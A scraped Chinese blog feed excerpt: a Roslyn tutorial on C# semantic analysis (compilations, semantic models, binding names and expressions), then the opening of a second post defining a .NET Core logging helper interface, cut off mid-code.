&lt;p data-source-line=&quot;10&quot;&gt;今天，Visual Basic和C＃编译器是黑盒子：输入文本然后输出字节，编译管道的中间阶段没有透明性。使用.NET编译器平台（以前称为“Roslyn”），工具和开发人员可以利用编译器使用的完全相同的数据结构和算法来分析和理解代码。&lt;/p&gt;
&lt;p data-source-line=&quot;12&quot;&gt;本篇文章，我们将探索Symbol和BindingAPI。通过语法API来查看解析器，语法树，用于推理和构造它们的实用程序。&lt;/p&gt;

&lt;p data-source-line=&quot;16&quot;&gt;这个语法API能让你看程序的结构。但是，通常您需要有关程序语义或含义的更丰富信息。虽然松散的代码片段可以单独进行语法分析，但孤立的提出诸如“这个变量的类型是什么”之类的问题并不是很有意义。类型名称的含义可能取决于程序集引用，命名空间导入或其他代码文件。这就是Compilation类的用武之地。&lt;/p&gt;
&lt;p data-source-line=&quot;19&quot;&gt;编译类似于编译器看到的单个项目，表示编译Visual Basic或C＃程序所需的所有内容，例如程序集引用，编译器选项和要编译的源文件集。 通过此上下文，您可以推断出代码的含义。 编译允许您查找符号 - 名称和其他表达式引用的类型，名称空间，成员和变量等实体。 将名称和表达式与符号(Symbols)相关联的过程称为Binding。&lt;/p&gt;
&lt;p data-source-line=&quot;21&quot;&gt;与SyntaxTree一样，Compilation是一个具有特定语言派生类的抽象类。创建Compilation实例时，必须在CSharpCompilation（或VisualBasicCompilation）类上调用工厂方法。&lt;/p&gt;

&lt;ul data-source-line=&quot;25&quot;&gt;&lt;li&gt;引入Nuget&lt;/li&gt;
&lt;/ul&gt;&lt;pre data-source-line=&quot;26&quot;&gt;
&lt;code class=&quot;hljs&quot;&gt;  Microsoft.CodeAnalysis.CSharp
 
  Microsoft.CodeAnalysis.CSharp.Workspaces
&lt;/code&gt;
&lt;/pre&gt;
&lt;ul data-source-line=&quot;32&quot;&gt;&lt;li&gt;上节提到的演示Main代码&lt;/li&gt;
&lt;/ul&gt;&lt;pre data-source-line=&quot;33&quot;&gt;
&lt;code class=&quot;hljs&quot;&gt;  class Program
   {
       static void Main(string[] args)
       {
           SyntaxTree tree = CSharpSyntaxTree.ParseText(
                       @&quot;using System;
                       using System.Collections.Generic;
                       using System.Text;
                        
                       namespace HelloWorld
                       {
                           class Program
                           {
                               static void Main(string[] args)
                               {
                                   Console.WriteLine(&quot;&quot;Hello, World!&quot;&quot;);
                               }
                           }
                       }&quot;);

           var root = (CompilationUnitSyntax)tree.GetRoot();
        }
   }
           
&lt;/code&gt;
&lt;/pre&gt;
&lt;ul data-source-line=&quot;59&quot;&gt;&lt;li&gt;接下来，在Main方法的末尾创建CSharpCompilation对象&lt;/li&gt;
&lt;/ul&gt;&lt;pre data-source-line=&quot;60&quot;&gt;
&lt;code class=&quot;hljs&quot;&gt;var compilation = CSharpCompilation.Create(&quot;HelloWorld&quot;)
                                               .AddReferences(
                                                    MetadataReference.CreateFromFile(
                                                        typeof(object).Assembly.Location))
                                               .AddSyntaxTrees(tree);
&lt;/code&gt;
&lt;/pre&gt;
&lt;ul data-source-line=&quot;68&quot;&gt;&lt;li&gt;设置断点，启动调试，在compilation处查看提示。&lt;/li&gt;
&lt;/ul&gt;
&lt;p data-source-line=&quot;70&quot;&gt;一旦你有了编译，你可以要求它为该编译中包含的任何SyntaxTree提供SemanticModel。你可以查询SemanticModel来回答诸如“这个位置的范围是什么名称？”，“从这种方法可以获得哪些成员？” ，“在这个文本块中使用了哪些变量？”和“这个名字/表达是指什么？”之类的问题。&lt;/p&gt;
&lt;h2 id=&quot;示例-绑定名称&quot; data-source-line=&quot;71&quot;&gt;示例-绑定名称&lt;/h2&gt;
&lt;p data-source-line=&quot;73&quot;&gt;此示例显示如何为HelloWorld SyntaxTree获取SemanticModel对象。获得SemanticModel后，第一个using指令中的名称绑定为System命名空间的符号。&lt;/p&gt;
&lt;ul data-source-line=&quot;75&quot;&gt;&lt;li&gt;将下段代码放到Main的末尾。&lt;/li&gt;
&lt;/ul&gt;&lt;pre data-source-line=&quot;77&quot;&gt;
&lt;code class=&quot;hljs&quot;&gt;
   var model = compilation.GetSemanticModel(tree);
   
   var nameInfo = model.GetSymbolInfo(root.Usings[0].Name);
   
   var systemSymbol = (INamespaceSymbol)nameInfo.Symbol;
  
&lt;/code&gt;
&lt;/pre&gt;
&lt;p data-source-line=&quot;86&quot;&gt;*追加以下代码，枚举System命名空间的子命名空间并将其名称打印到控制台：&lt;/p&gt;
&lt;pre data-source-line=&quot;88&quot;&gt;
&lt;code class=&quot;hljs&quot;&gt; foreach (var ns in systemSymbol.GetNamespaceMembers())
            {
                Console.WriteLine(ns.Name);
            }
&lt;/code&gt;
&lt;/pre&gt;
&lt;ul data-source-line=&quot;94&quot;&gt;&lt;li&gt;Debug进入调试，查看每个节点的值。Console输出结果如下：&lt;/li&gt;
&lt;/ul&gt;&lt;pre data-source-line=&quot;95&quot;&gt;
&lt;code class=&quot;hljs&quot;&gt;Buffers
Collections
ComponentModel
Configuration
Diagnostics
Globalization
IO
Numerics
Reflection
Resources
Runtime
Security
StubHelpers
Text
Threading
&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;示例-绑定表达式&quot; data-source-line=&quot;112&quot;&gt;示例--绑定表达式&lt;/h2&gt;
&lt;p data-source-line=&quot;113&quot;&gt;前面的示例显示了如何绑定name去查找Symbol。但是，在C＃程序中还有其他不是Name的表达式可以绑定。此示例显示绑定如何与其他表达式类型一起使用 - 在本例中为简单的字符串文字。&lt;/p&gt;
&lt;pre data-source-line=&quot;115&quot;&gt;
&lt;code class=&quot;hljs&quot;&gt;var helloWorldString = root.DescendantNodes()
                                       .OfType&amp;lt;LiteralExpressionSyntax&amp;gt;()
                                       .First();
                                       
var literalInfo = model.GetTypeInfo(helloWorldString);


var stringTypeSymbol = (INamedTypeSymbol)literalInfo.Type;
 
Console.Clear();
            
foreach (var name in (from method in stringTypeSymbol.GetMembers()
                                                      .OfType&amp;lt;IMethodSymbol&amp;gt;()
                       where method.ReturnType.Equals(stringTypeSymbol) &amp;amp;&amp;amp;
                             method.DeclaredAccessibility == 
                                        Accessibility.Public
                       select method.Name).Distinct())
{
    Console.WriteLine(name);
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;ul data-source-line=&quot;137&quot;&gt;&lt;li&gt;运行Debug，查看相关节点的值，Console输出结果如下&lt;/li&gt;
&lt;/ul&gt;&lt;pre data-source-line=&quot;138&quot;&gt;
&lt;code class=&quot;hljs&quot;&gt;Intern
IsInterned
Create
Copy
ToString
Normalize
Concat
Format
Insert
Join
PadLeft
PadRight
Remove
Replace
Substring
ToLower
ToLowerInvariant
ToUpper
ToUpperInvariant
Trim
TrimStart
TrimEnd
&lt;/code&gt;
&lt;/pre&gt;

&lt;p data-source-line=&quot;165&quot;&gt;本篇文章演示了语义分析，通过两个示例分别演示绑定Name查找Symbol和绑定表达式 我们可以获得以下几个知识点：&lt;/p&gt;
&lt;blockquote data-source-line=&quot;168&quot; readability=&quot;5&quot;&gt;
&lt;p&gt;获取语法树的根节点：(CompilationUnitSyntax)tree.GetRoot()&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote data-source-line=&quot;170&quot; readability=&quot;6&quot;&gt;
&lt;p&gt;用于创建CSharpCompilation对象：CSharpCompilation.Create(&quot;HelloWorld&quot;).AddReferences( MetadataReference.CreateFromFile( typeof(object).Assembly.Location)) .AddSyntaxTrees(tree)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote data-source-line=&quot;173&quot; readability=&quot;5&quot;&gt;
&lt;p&gt;用于获取模型：compilation.GetSemanticModel(tree);&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote data-source-line=&quot;175&quot; readability=&quot;5&quot;&gt;
&lt;p&gt;获取Name的Symbol信息： model.GetSymbolInfo(root.Usings[0].Name);&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote data-source-line=&quot;177&quot; readability=&quot;5&quot;&gt;
&lt;p&gt;可获取具体命名空间名：(INamespaceSymbol)nameInfo.Symbol;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote data-source-line=&quot;179&quot; readability=&quot;5&quot;&gt;
&lt;p&gt;获取当前命名空间下所有成员：systemSymbol.GetNamespaceMembers()&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote data-source-line=&quot;181&quot; readability=&quot;5&quot;&gt;
&lt;p&gt;获取文字表达式：root.DescendantNodes().OfType&amp;lt;LiteralExpressionSyntax&amp;gt;()&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote data-source-line=&quot;183&quot; readability=&quot;5&quot;&gt;
&lt;p&gt;获取Type信息 model.GetTypeInfo(helloWorldString)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote data-source-line=&quot;185&quot; readability=&quot;5&quot;&gt;
&lt;p&gt;获取具体的Type类型 (INamedTypeSymbol)literalInfo.Type;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote data-source-line=&quot;187&quot; readability=&quot;6.6857142857143&quot;&gt;
&lt;p&gt;获取返回值是string，公开类型的方法： from method in stringTypeSymbol.GetMembers().OfType&amp;lt;IMethodSymbol&amp;gt;() where method.ReturnType.Equals(stringTypeSymbol) &amp;amp;&amp;amp; method.DeclaredAccessibility == Accessibility.Public select &lt;a href=&quot;http://method.name/&quot; target=&quot;_blank&quot;&gt;method.Name&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p data-source-line=&quot;195&quot;&gt;&lt;a href=&quot;https://www.github.com/fancunwei/csharpfandemo&quot; target=&quot;_blank&quot;&gt;csharpfandemo&lt;/a&gt;&lt;/p&gt;

&lt;p data-source-line=&quot;199&quot;&gt;&lt;a href=&quot;https://github.com/dotnet/roslyn/wiki/Getting-Started-C%23-Semantic-Analysis&quot; target=&quot;_blank&quot;&gt;Getting Started C# Semantic Analysis&lt;/a&gt;&lt;/p&gt;
</description>
<pubDate>Fri, 26 Oct 2018 05:33:00 +0000</pubDate>
<dc:creator>范存威</dc:creator>
<og:description>先决条件 Visual Studio 2017 .NET Compiler Platform SDK Rosyln入门（一）-C＃语法分析 简介 今天，Visual Basic和C＃编译器是黑盒子：输</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/fancunwei/p/9855834.html</dc:identifier>
</item>
<item>
<title>从壹开始前后端分离 [.netCore 不定期更新 ] 三十五║ 完美实现全局异常日志记录 - 老张的哲学</title>
<link>http://www.cnblogs.com/laozhang-is-phi/p/9855836.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/laozhang-is-phi/p/9855836.html</guid>
<description>&lt;p&gt;哈喽我是不定期更新的日常，昨天群里小伙伴问到了记录日志，当然，以前我也挖过这个坑，后来一直没有来得及填上，也想着 swagger 一直又有错误信息展示的功能，就迟迟没有添加这个功能，不过昨天夜里想了想，还是需要增加上，旨在提高框架的高效性。不定期日常就直接上代码了，我有一个小想法，就是希望大家有好的想法，可以给我说，我会整理下，添加到框架里，并在文章头里写上&lt;/p&gt;
&lt;blockquote readability=&quot;6.5138888888889&quot;&gt;
&lt;p&gt;&lt;span&gt;投稿作者&lt;/span&gt;：这里重点说明下，是参考群里小伙伴 &lt;a href=&quot;https://gitee.com/lxd_8023&quot; target=&quot;_blank&quot;&gt;Hello World! &lt;/a&gt; 的相关内容，并在他的基础上更新，添加了注入和全局，大家可以看看他的文章，支持开源，棒棒哒。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;废话不多，直接来看，最终的效果是这样的：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1468246/201810/1468246-20181026132548219-75234028.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;


&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;感谢网友@的意见，目前是在 .net core api 中可以捕获，至于 mvc 的view视图中的错误是否可以，热心观众可以试试，感激不尽&lt;/p&gt;
&lt;/blockquote&gt;


&lt;p&gt;在 Blog.core 下的 Log 文件夹内，新建 ILoggerHelper.cs &lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;67&quot;&gt;
&lt;pre&gt;
&lt;span&gt;namespace&lt;/span&gt;&lt;span&gt; Blog.Core.Log
{
    &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 日志接口
    &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;interface&lt;/span&gt;&lt;span&gt; ILoggerHelper
    {
       
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 调试信息
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;source&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;source&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;message&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;message&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;void&lt;/span&gt; Debug(&lt;span&gt;object&lt;/span&gt; source, &lt;span&gt;string&lt;/span&gt;&lt;span&gt; message);
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 调试信息
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;source&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;source&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;message&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;message&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;ps&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;ps&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;void&lt;/span&gt; Debug(&lt;span&gt;object&lt;/span&gt; source, &lt;span&gt;string&lt;/span&gt; message, &lt;span&gt;params&lt;/span&gt; &lt;span&gt;object&lt;/span&gt;&lt;span&gt;[] ps);
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 调试信息
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;source&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;source&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;message&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;message&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;void&lt;/span&gt; Debug(Type source, &lt;span&gt;string&lt;/span&gt;&lt;span&gt; message);
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 关键信息
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;source&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;source&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;message&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;message&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;void&lt;/span&gt; Info(&lt;span&gt;object&lt;/span&gt; source, &lt;span&gt;object&lt;/span&gt;&lt;span&gt; message);
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 关键信息
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;source&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;source&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;message&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;message&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;void&lt;/span&gt; Info(Type source, &lt;span&gt;object&lt;/span&gt;&lt;span&gt; message);
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 警告信息
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;source&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;source&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;message&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;message&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;void&lt;/span&gt; Warn(&lt;span&gt;object&lt;/span&gt; source, &lt;span&gt;object&lt;/span&gt;&lt;span&gt; message);
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 警告信息
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;source&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;source&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;message&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;message&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;void&lt;/span&gt; Warn(Type source, &lt;span&gt;object&lt;/span&gt;&lt;span&gt; message);
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 错误信息
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;source&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;source&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;message&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;message&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;void&lt;/span&gt; Error(&lt;span&gt;object&lt;/span&gt; source, &lt;span&gt;object&lt;/span&gt;&lt;span&gt; message);
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 错误信息
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;source&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;source&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;message&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;message&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;void&lt;/span&gt; Error(Type source, &lt;span&gt;object&lt;/span&gt;&lt;span&gt; message);
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 失败信息
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;source&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;source&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;message&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;message&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;void&lt;/span&gt; Fatal(&lt;span&gt;object&lt;/span&gt; source, &lt;span&gt;object&lt;/span&gt;&lt;span&gt; message);
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 失败信息
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;source&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;source&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;message&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;message&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;void&lt;/span&gt; Fatal(Type source, &lt;span&gt;object&lt;/span&gt;&lt;span&gt; message);

        &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Log a message object and exception &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;

        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 调试信息
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;source&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;source&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;message&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;message&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;exception&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;ex&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;void&lt;/span&gt; Debug(&lt;span&gt;object&lt;/span&gt; source, &lt;span&gt;object&lt;/span&gt;&lt;span&gt; message, Exception exception);
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 调试信息
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;source&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;source&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;message&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;message&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;exception&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;ex&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;void&lt;/span&gt; Debug(Type source, &lt;span&gt;object&lt;/span&gt;&lt;span&gt; message, Exception exception);
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 关键信息
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;source&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;source&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;message&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;message&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;exception&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;ex&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;void&lt;/span&gt; Info(&lt;span&gt;object&lt;/span&gt; source, &lt;span&gt;object&lt;/span&gt;&lt;span&gt; message, Exception exception);
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 关键信息
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;source&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;source&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;message&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;message&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;exception&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;ex&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;void&lt;/span&gt; Info(Type source, &lt;span&gt;object&lt;/span&gt;&lt;span&gt; message, Exception exception);
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 警告信息
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;source&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;source&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;message&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;message&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;exception&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;ex&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
